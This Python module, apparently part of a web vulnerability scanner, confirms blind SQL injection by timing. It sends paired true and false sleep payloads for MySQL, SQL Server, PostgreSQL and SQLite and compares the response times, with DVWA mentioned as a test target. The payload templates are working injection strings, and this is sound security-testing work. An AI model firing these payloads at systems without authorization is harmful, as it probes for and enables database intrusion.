"""Stage 2 timing test, for SQL injection that never changes the page.

Two payloads that differ only in a true or false condition, with a sleep
behind it. Confirmed only if the medians are far apart and the slowest
false sample is still quicker than the fastest true one, so random
slowness (like /jitter) cannot pass.
"""
import statistics

from ..findings import Finding, Verdict
from ..probe import send

# how long we ask the database to wait. it has to sit well clear of ordinary
# slowness, and /jitter stalls for a whole second, so 2 leaves room to tell the
# two apart.
DELAY_SECONDS = 2

SAMPLES = 10

# how much of the delay we insist on actually seeing. under 1.0 because a
# request that got cut short is not proof of anything.
MIN_SHARE = 0.8

# A sleep can run once per row (2 s x 5 rows = 10 s on DVWA), so timing
# requests get a much longer timeout than normal.
TIMEOUT_HEADROOM = 8

# and because those requests can be slow, cap how long one point may take rather
# than multiplying a ten second request by twenty and walking away for an hour
SAMPLING_BUDGET_MS = 120_000


def _timeout_for(delay_seconds):
    return delay_seconds * TIMEOUT_HEADROOM + 5

# One payload per database, in AND and OR form. {cond} is filled with an always
# true and then an always false condition. Both forms are needed because the
# database stops early: AND skips the sleep when the start value matches no
# row, which is how DVWA's blind sqli hid until the OR form was added.
TEMPLATES = [
    "' AND IF({cond},SLEEP({d}),0) -- ",                            # mysql, text
    "' OR IF({cond},SLEEP({d}),0) -- ",                             # mysql, text
    " AND IF({cond},SLEEP({d}),0)",                                 # mysql, number
    " OR IF({cond},SLEEP({d}),0)",                                  # mysql, number
    "'; IF ({cond}) WAITFOR DELAY '0:0:{d}' -- ",                   # sql server
    " AND (CASE WHEN {cond} THEN (SELECT 1 FROM pg_sleep({d})) ELSE 1 END)=1",  # postgres
    " AND (CASE WHEN {cond} THEN sleep({d}) ELSE 0 END)",           # sqlite
    " OR (CASE WHEN {cond} THEN sleep({d}) ELSE 0 END)",            # sqlite
]

# same length, so the two payloads built from a template come out identical
# apart from the condition itself
TRUE_COND = "1=1"
FALSE_COND = "1=2"


def looks_delayed(true_ms, false_ms, delay_seconds=DELAY_SECONDS):
    """Did the true payload really make the server wait? Returns (bool, stats).

    No requests, so the rules can be tested on made up samples.
    """
    if not true_ms or not false_ms:
        return False, {}

    true_median = statistics.median(true_ms)
    false_median = statistics.median(false_ms)
    gap = true_median - false_median
    separated = min(true_ms) > max(false_ms)
    wanted_ms = delay_seconds * 1000 * MIN_SHARE

    stats = {
        "samples": len(true_ms),
        "true_median_ms": round(true_median, 1),
        "false_median_ms": round(false_median, 1),
        "true_min_ms": round(min(true_ms), 1),
        "false_max_ms": round(max(false_ms), 1),
        "median_gap_ms": round(gap, 1),
        "delay_asked_ms": delay_seconds * 1000,
        "ranges_separated": separated,
    }
    return bool(gap >= wanted_ms and separated), stats


def _collect(client, point, true_payload, false_payload, count, timeout):
    """Take the samples, alternating, so anything that drifts hits both sets."""
    true_ms, false_ms = [], []
    for _ in range(count):
        true_ms.append(send(client, point, true_payload, timeout=timeout).elapsed_ms)
        false_ms.append(send(client, point, false_payload, timeout=timeout).elapsed_ms)
    return true_ms, false_ms


def validate(client, point, reason=None, delay_seconds=DELAY_SECONDS, samples=SAMPLES):
    base = point.value or "1"
    screen_ms = delay_seconds * 1000 * MIN_SHARE
    tried = []

    for template in TEMPLATES:
        true_payload = base + template.format(cond=TRUE_COND, d=delay_seconds)
        false_payload = base + template.format(cond=FALSE_COND, d=delay_seconds)

        timeout = _timeout_for(delay_seconds)

        try:
            # one cheap look before committing to twenty slow requests. a
            # payload the database never ran comes back at normal speed the
            # first time, and most of them never run, wrong dialect or no bug.
            first = send(client, point, true_payload, timeout=timeout)
            if first.elapsed_ms < screen_ms:
                tried.append({
                    "true_payload": true_payload,
                    "elapsed_ms": round(first.elapsed_ms, 1),
                    "result": "came back at normal speed",
                })
                continue

            # now we know what one costs, work out how many we can afford
            affordable = int(SAMPLING_BUDGET_MS / max(first.elapsed_ms, 1.0))
            take = max(5, min(samples, affordable))

            true_ms, false_ms = _collect(client, point, true_payload,
                                         false_payload, take, timeout)
        except Exception as e:
            return Finding("sqli", point, Verdict.UNCONFIRMED,
                           f"could not finish the timing test: {e}",
                           {"detector_reason": reason, "technique": "timing",
                            "attempts": tried})

        delayed, stats = looks_delayed(true_ms, false_ms, delay_seconds)
        proof = {
            "true_payload": true_payload,
            "false_payload": false_payload,
            **stats,
            "true_ms": [round(v, 1) for v in true_ms],
            "false_ms": [round(v, 1) for v in false_ms],
        }

        if delayed:
            return Finding(
                "sqli", point, Verdict.CONFIRMED,
                f"true condition took {stats['median_gap_ms']:.0f} ms longer than "
                f"false, every time, over {take} samples each",
                {"detector_reason": reason, "technique": "timing", "proof": proof},
            )

        # something here is slow, but it is not the condition doing it. keep the
        # numbers and carry on, another dialect may still be the right one.
        proof["result"] = "slow, but not consistently tied to the condition"
        tried.append(proof)

    return Finding("sqli", point, Verdict.REJECTED,
                   f"none of the {len(TEMPLATES)} timing payloads made the server "
                   f"wait on the true condition only",
                   {"detector_reason": reason, "technique": "timing",
                    "attempts": tried})
